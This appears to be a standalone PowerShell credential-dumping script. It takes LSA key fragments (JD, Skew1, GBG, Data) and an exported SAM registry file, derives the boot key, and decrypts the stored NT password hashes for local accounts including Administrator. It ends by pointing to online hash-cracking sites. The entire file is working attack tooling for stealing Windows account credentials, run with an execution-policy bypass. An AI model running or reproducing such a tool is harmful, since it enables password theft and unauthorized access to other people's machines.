#########################################################################
### powershell -ep bypass -c C:\Users\Admin\Desktop\sam\sam_clean.ps1 ###
#########################################################################

Clear-Host
$ErrorActionPreference = "Stop"

function Convert-HexStringToByteArray {
    param([string]$HexString)
    $HexString = $HexString -replace '[^0-9A-Fa-f]',''
    if ($HexString.Length % 2) { $HexString = "0$HexString" }
    
    [byte[]]$Bytes = @()
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $Bytes += [Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $Bytes
}

class BootKeyExtractor {
    [byte[]]$BootKey
    [hashtable]$HashData
    
    BootKeyExtractor([string]$CombinedLSAKey, [string]$LSAKey, [string]$BootKey) {
        $this.BootKey = Convert-HexStringToByteArray $BootKey
        $this.HashData = @{}
    }
    
    [void]LoadRegistryData([string]$FilePath) {
        $content = Get-Content $FilePath -Raw
        $userPattern = 'HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\([0-9A-F]{8})'
        $matches = [regex]::Matches($content, $userPattern)
        
        foreach ($match in $matches) {
            $rid = [Convert]::ToInt32($match.Groups[1].Value, 16)
            $vPattern = "\\$($match.Groups[1].Value)[\s\S]*?""V""=hex:([\s\S]*?)(?=""\w|$)"
            if ($content -match $vPattern) {
                $vValue = $matches[1] -replace '\\\r\n\s*','' -replace ',',''
                $vBytes = Convert-HexStringToByteArray $vValue
                $pattern = [byte[]]@(0x02, 0x00, 0x02, 0x00, 0x10, 0x00, 0x00, 0x00)
                $patternIndex = -1
                
                for ($i = 0; $i -lt ($vBytes.Length - $pattern.Length); $i++) {
                    if (($vBytes[$i..($i+7)] -join '') -eq ($pattern -join '')) {
                        $patternIndex = $i
                        break
                    }
                }
                
                if ($patternIndex -ne -1) {
                    $ivStart = $patternIndex + 8
                    $iv = $vBytes[$ivStart..($ivStart + 15)]
                    $hashDataStart = $ivStart + 16
                    $encryptedData = $vBytes[$hashDataStart..($hashDataStart + 31)]
                    
                    if (($encryptedData | Where-Object { $_ -ne 0 }).Count -gt 0) {
                        $this.HashData[$rid] = @{
                            IV = $iv
                            EncryptedData = $encryptedData
                        }
                    }
                }
            }
        }
    }

    [byte[][]]ComputeUserKeys([int]$RID) {
        $RIDBytes = [BitConverter]::GetBytes($RID)
        $k = @(
            @($RIDBytes[0], $RIDBytes[1], $RIDBytes[2], $RIDBytes[3], $RIDBytes[0], $RIDBytes[1], $RIDBytes[2]),
            @($RIDBytes[3], $RIDBytes[0], $RIDBytes[1], $RIDBytes[2], $RIDBytes[3], $RIDBytes[0], $RIDBytes[1])
        )

        for($i = 0; $i -lt 2; $i++) {
            $key = @(
                [byte](($k[$i][0] -shr 1) -band 0xFF),
                [byte]((($k[$i][0] -band 0x01) -shl 6) -bor ($k[$i][1] -shr 2)),
                [byte]((($k[$i][1] -band 0x03) -shl 5) -bor ($k[$i][2] -shr 3)),
                [byte]((($k[$i][2] -band 0x07) -shl 4) -bor ($k[$i][3] -shr 4)),
                [byte]((($k[$i][3] -band 0x0F) -shl 3) -bor ($k[$i][4] -shr 5)),
                [byte]((($k[$i][4] -band 0x1F) -shl 2) -bor ($k[$i][5] -shr 6)),
                [byte]((($k[$i][5] -band 0x3F) -shl 1) -bor ($k[$i][6] -shr 7)),
                [byte]($k[$i][6] -band 0x7F)
            )
            for($j = 0; $j -lt 8; $j++) { $key[$j] = [byte](($key[$j] -shl 1) -band 0xFE) }
            $k[$i] = $key
        }
        return $k
    }

    [void]DecryptUserHashes() {
        $RIDs = @(0x1F4, 0x1F5, 0x1F7, 0x1F8, 0x3E8)
        
        foreach ($RID in $RIDs) {
            if (-not $this.HashData.ContainsKey($RID)) { continue }
            
            $ridData = $this.HashData[$RID]
            if ($null -eq $ridData.IV -or $ridData.IV.Length -ne 16 -or 
                $null -eq $ridData.EncryptedData -or $ridData.EncryptedData.Length -ne 32) { continue }
            
            $aes = [System.Security.Cryptography.Aes]::Create()
            try {
                $aes.KeySize = 128
                $aes.BlockSize = 128
                $aes.Key = $this.BootKey
                $aes.IV = $ridData.IV
                $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
                
                $DecryptedNTHash = $aes.CreateDecryptor().TransformFinalBlock($ridData.EncryptedData, 0, 32)
                
                if ($DecryptedNTHash.Length -gt 0) {
                    $UserKeys = $this.ComputeUserKeys($RID)
                    $DES1 = [System.Security.Cryptography.DES]::Create()
                    $DES2 = [System.Security.Cryptography.DES]::Create()
                    try {
                        $DES1.Mode = $DES2.Mode = [System.Security.Cryptography.CipherMode]::ECB
                        $DES1.Padding = $DES2.Padding = [System.Security.Cryptography.PaddingMode]::None
                        $DES1.Key = Add-DESKeyParity $UserKeys[0]
                        $DES2.Key = Add-DESKeyParity $UserKeys[1]
                        
                        $Part1 = $DES1.CreateDecryptor().TransformFinalBlock($DecryptedNTHash[0..7], 0, 8)
                        $Part2 = $DES2.CreateDecryptor().TransformFinalBlock($DecryptedNTHash[8..15], 0, 8)
                        
                        Write-Host "`nRID $([Convert]::ToString($RID, 16)) Hash: $([BitConverter]::ToString($Part1 + $Part2) -replace '-')"
                    }
                    finally {
                        $DES1.Dispose()
                        $DES2.Dispose()
                    }
                }
            }
            finally { $aes.Dispose() }
        }
    }
}

function Add-DESKeyParity {
    param([byte[]]$Key)
    $KeyWithParity = [byte[]]::new(8)
    [Array]::Copy($Key, $KeyWithParity, 8)
    
    for($i = 0; $i -lt 8; $i++) {
        $byte = $KeyWithParity[$i]
        $ones = 0
        for($j = 0; $j -lt 7; $j++) {
            if(($byte -band (1 -shl $j)) -ne 0) { $ones++ }
        }
        $KeyWithParity[$i] = if($ones % 2 -eq 0) { $byte -bor 1 } else { $byte -band 0xFE }
    }
    return $KeyWithParity
}

function Generate-Keys {
    param ([string]$JD, [string]$Skew1, [string]$GBG, [string]$Data, [string]$SAM_regfile)
    
    $Combined_LSA_key = "$JD$Skew1$GBG$Data"
    $combined_bytes = Convert-HexStringToByteArray $Combined_LSA_key    
    $lsa_bytes = New-Object byte[] 16
    
    $scrambled = @(8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7)
    for($i = 0; $i -lt 16; $i++) { $lsa_bytes[$i] = $combined_bytes[$scrambled[$i]] }
    
    $LSA_key = [BitConverter]::ToString($lsa_bytes) -replace '-'
    
    $registry_data = Get-Content $SAM_regfile -Raw
    if ($registry_data -match '"F"=hex:([^"]+)') {
        $f_bytes = Convert-HexStringToByteArray ($matches[1] -replace '\\|\s|,\r\n\s*','')
        $iv = $f_bytes[120..135]
        $encrypted_data = $f_bytes[136..167]
                
        $aes = [System.Security.Cryptography.Aes]::Create()
        try {
            $aes.KeySize = 128
            $aes.BlockSize = 128
            $aes.Key = $lsa_bytes
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
            $aes.IV = $iv
            
            $boot_bytes = $aes.CreateDecryptor().TransformFinalBlock($encrypted_data, 0, $encrypted_data.Length)
            $Boot_key = [BitConverter]::ToString($boot_bytes[0..15]) -replace '-'
        }
        finally { $aes.Dispose() }
    }
    
    return @{
        Combined_LSA_key = $Combined_LSA_key.ToUpper()
        LSA_key = $LSA_key
        Boot_key = $Boot_key
    }
}

function Get-UserInput {
    Clear-Host
    Write-Host "`n</> Please Enter the Following Values </>`n"
    $validPattern = '^[a-fA-F0-9]{8,}$'
    
    $inputs = @(
        @{ Name = "JD"; Value = $null },
        @{ Name = "Skew1"; Value = $null },
        @{ Name = "GBG"; Value = $null },
        @{ Name = "Data"; Value = $null }
    )
    
    foreach ($input in $inputs) {
        $input.Value = Read-Host "[~] $($input.Name)"
        if ($input.Value -notmatch $validPattern) {
            Write-Host "`n</> INPUT DATA ERROR </>"
            Write-Host "Press any key to start again..."
            $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
            return $null
        }
    }
    
    $SAMPath = Read-Host "[~] Path to SAM Regfile"
    
    return @{
        JD = $inputs[0].Value
        Skew1 = $inputs[1].Value
        GBG = $inputs[2].Value
        Data = $inputs[3].Value
        SAMPath = $SAMPath
    }
}

try {
    while ($true) {
        $userInput = Get-UserInput
        if ($userInput -ne $null) {
            $keys = Generate-Keys -JD $userInput.JD -Skew1 $userInput.Skew1 -GBG $userInput.GBG -Data $userInput.Data -SAM_regfile $userInput.SAMPath
            break
        }
    }

    $Extractor = [BootKeyExtractor]::new($keys.Combined_LSA_key, $keys.LSA_key, $keys.Boot_key)
    $Extractor.LoadRegistryData($userInput.SAMPath)
    $Extractor.DecryptUserHashes()
    
    Write-Host "`n[!] Decrypt Hashes: https://hashes.com/en/decrypt"
    Write-Host "[!] Decrypt Hashes: https://crackstation.net"
    Write-Host "[!] Decrypt Hashes: https://md5decrypt.net/en/Ntlm`n"
}
catch {
    Write-Error "Error: $($_.Exception.Message)"
}
